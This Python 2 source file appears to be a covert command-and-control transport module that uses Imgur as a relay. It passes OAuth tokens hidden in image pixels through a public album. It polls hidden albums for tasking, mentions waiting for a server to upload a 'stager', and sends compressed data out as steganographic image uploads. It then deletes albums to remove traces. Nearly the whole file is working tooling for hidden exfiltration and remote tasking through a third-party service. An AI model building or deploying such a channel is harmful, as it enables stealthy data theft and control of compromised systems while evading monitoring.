from imgurpython import ImgurClient, helpers
import PIL
from PIL import Image
from cStringIO import StringIO
import time
from sys import exit
import urlparse
import base64
import requests
import zlib
import utils.encoders.encoder_lsbjpg as encoder

# YOU NEED TO GET A TOKEN FOR YOUR APPLICATION FIRST.
# SET UP YOUR ACCOUNT.


# <START OF GHETTO CONFIG SECTION>
TOKEN_LEN = 81 # Don't change this
USERNAME = ''
client_id = ''
client_secret = ''
SEND_ALBUM_NAME = "TSK4U"
RECV_ALBUM_NAME = "RESP4U"
access_token = ''
refresh_token = ''
# </END OF GHETTO CONFIG SECTION>

# Server's transport will handle access tokens and whatnot.

# client's prepTransport will have to handle token refreshes. 
# TODO: Client won't last more than a month without this logic.
#   - need to add authtoken refresh logic

def resetAccount():
	account_albums = client.get_account_albums(USERNAME)
	for album in account_albums:
		images = client.get_album_images(album.id)
		for image in images:
			client.delete_image(image.id)
		client.album_delete(album.id)

def prepClientTransport():
	global client
	client = ImgurClient(client_id, client_secret)

	getTokens()
	return 0

def getTokens():
	while True:
		try:
			account_albums = client.get_account_albums(USERNAME)
			account_albums[0]
			if account_albums[0].title == "TK4U":
				break
			else:
				print "No new albums yet, sleeping for 2m"
		except IndexError:
			print "No new albums yet, sleeping for 2m"
			time.sleep(120)

	x = 0
	for x in range(0, len(account_albums)):
		token_image = client.get_album_images(account_albums[x].id)[0]
		token_img = Image.open(StringIO(requests.get(token_image.link).content))
		stego_pix = token_img.load()
		if stego_pix[0,0] == (1,1,1):
			print "Token images found!"
			break
		else:
			x = x + 1
			pass

	token_bytes = []
	for x in range(1, token_img.size[1]):
		token_bytes.append(chr(stego_pix[x,x][2]))
	tokens = ''.join(token_bytes[0:TOKEN_LEN]).split(',')

	global access_token
	access_token = tokens[0]
	global refresh_token
	refresh_token = tokens[1]

	# Cleanup time!
	client.set_user_auth(access_token, refresh_token)
	resetAccount()

	print "Sleeping for 600s to allow server to upload stager"
	time.sleep(600)

	return 0


def checkStatus(silent=True):
	# Checks the account status
	#   if we discover we don't have enough credits to continue, we will sleep until our credits are reset
	credits = client.make_request('GET', 'credits')

	# Supports pseudo debug output
	if silent == False:
		print "%d credits remaining of %d for this user's ip" %(credits['UserRemaining'], credits['UserLimit'])
		print "%d credits remaining of %d for this client" %(credits['ClientRemaining'], credits['ClientLimit'])
		print "User credits reset @ " + str(time.ctime(credits['UserReset']))

	# Wait for our credits to reset if we don't have enough
	if int(credits['UserRemaining']) < 10:
		print "WARNING: Not enough credits to continue making requests, waiting for credits to replenish"
		while time.time() <= credits['UserReset']:
			print "Current time: " + str(time.ctime(time.time()))
			print "Reset @ %s, sleeping for 5m" % (time.ctime(credits['UserReset']))
			time.sleep(300)
		print "Credits reset!"
		checkStatus()
	return credits


def sendTokens(tokens):
	# Sends tokens in plain text. Eventually, I'd like to get it so I can
	# just pass it to the encoder, but this works for a prototype
		
	img = Image.new('RGB', (4320,4320), color = 'red')
	pix = img.load()
	token_list = list(tokens)
	token_list = bytearray(str(token_list[0]) + "," + str(token_list[1]))
	for byte in token_list:
		for x in range(1, len(token_list) + 1):
			byte = token_list[x-1]
			# Write the byte to the blue value in the pixel
			pix[x,x] = (pix[x,x][0], pix[x,x][1], byte)
			x = x + 1
		pass
	# Insert a UPDATE_TOKENS header
	pix[0,0] = (1, 1, 1)
	# Upload image to new album
	fields = {}
	fields = { 'title': "TK4U", 'privacy': "public"}
	album_object = client.create_album(fields)
	fields.update({"id": album_object['id']})

	# Upload our image to the album
	img_byte_array = StringIO()
	img.save(img_byte_array, format='PNG')

	image_upload_fields = {}
	image_upload_fields = {'image': base64.b64encode(img_byte_array.getvalue()), 'type': 'base64', 'album': album_object['id']}
	while True:
		try:
			y = client.make_request('POST', 'upload', image_upload_fields)
		except helpers.error.ImgurClientRateLimitError:
			print "Hit the rate limit, sleeping for 10m"
			time.sleep(600)
			continue
		break


	# I know this is a very weird looking loop, but it was to fix a very weird bug
	while True:
		account_albums = client.get_account_albums(USERNAME)
		try:
			if account_albums[0].id:
				for album in account_albums:
					if album.id == album_object['id']:
						print "Album still exists, waiting 60 seconds for client to delete the tokens album"
						time.sleep(60)
						continue
			else:
				break
		except IndexError:
			break

	# Return the token's album hash
	return 0


def prepTransport():
	global client
	client = ImgurClient(client_id, client_secret)

	# Auth to imgur
	authorization_url = client.get_auth_url('token')

	print "Go to the following URL: {0}".format(authorization_url)
	try:
		token_url = raw_input("Insert the url you were redirected to with all parameters: ")
	except:
		token_url = input("Insert the url you were redirected to with all parameters: ")

	parsed = urlparse.urlparse(token_url)

	access_token = urlparse.parse_qs(parsed.fragment)['access_token'][0]
	refresh_token = urlparse.parse_qs(parsed.fragment)['refresh_token'][0]
	client.set_user_auth(access_token, refresh_token)

	if client.get_email_verification_status(USERNAME) == False:
		print "ERROR: YOU NEED TO VERIFY YOUR EMAIL. We'll send a verification request."
		client.send_verification_email(USERNAME)
		print "Verification email sent. Exiting..."
		exit(1)

	# Sending access and refresh token to client
	token_list = []
	token_list.append(access_token)
	token_list.append(refresh_token)
	token_album_hash = sendTokens(token_list)

	# Client has recieved the tokens
	return 0


def sendData(data):
	# Transport will receiving a list of images
	# Application will have already encoded the data
	# Logic will probably be different for client,
	# indicating that we're going to run into issues
	# Here, we're expecting to recieve a list of PIL images from the encoder
	fields = {}
	fields = { 'title': SEND_ALBUM_NAME, 'privacy': "hidden"}
	album_object = client.create_album(fields)
	fields.update({"id": album_object['id']})

	data = base64.b64encode(zlib.compress(data, 9))
	data_list = [data[i:i+4219] for i in range(0, len(data), 4219)]

	photo_id = 1
	image_upload_fields = {'type': 'base64', 'album': album_object['id']}

	credits = checkStatus(silent=False)
	# TODO: Add logic to safely check if we can upload photos here
	# if credits['UserRemaining'] < len(data_list) or credits['ClientRemaining'] < len(data_list):

	print "Uploading %d images" % (len(data_list))
	for chunk in data_list:
		photo = encoder.encode(chunk, photo_id=photo_id)
		image_upload_fields.update({'image': base64.b64encode(photo.getvalue())})
		while True:
			try:
				request = client.make_request('POST', 'upload', image_upload_fields)
			except helpers.error.ImgurClientRateLimitError:
				print "Hit the rate limit, sleeping for 10m"
				time.sleep(600)
				continue
			break
		photo_id = photo_id + 1
		del photo
		credits = checkStatus(silent=False)
		# If photo_id % 50, we'll sleep for 3 minutes to not trip our rate limit
		# There is an upload limit of 50 images per IP address per hour. 
		if photo_id % 40 == 0:
			print "Upload limit for this hour exceeded, sleeping until next hour"
			time.sleep(300)


def retrieveData():
	# Check for new albums
	while True:
		try:
			account_albums = client.get_account_albums(USERNAME)
			account_albums[0]
			if account_albums[0].title == RECV_ALBUM_NAME:
				break
			else:
				print "No new albums yet, sleeping for 2m"
				time.sleep(120)
		except IndexError:
			print "No new albums yet, sleeping for 2m"
			time.sleep(120)

	x = 0
	reconstructed_data = ""
	data_list = []

	# Iterate through each album
	for x in range(0, len(account_albums)):
		album_images = client.get_album_images(account_albums[x].id)

		# Iterate through each image in the album
		for image in album_images:
			curr_image_data = Image.open(StringIO(requests.get(image.link).content))
			data_list.append(encoder.decode(curr_image_data))
			pass
	
	# Reconstruct the data
	reconstructed_data = ''.join(data_list).strip('\0')

	resetAccount()

	# Now lets unbase64 and decompress this data
	raw_data = zlib.decompress(base64.b64decode(reconstructed_data))
	return raw_data
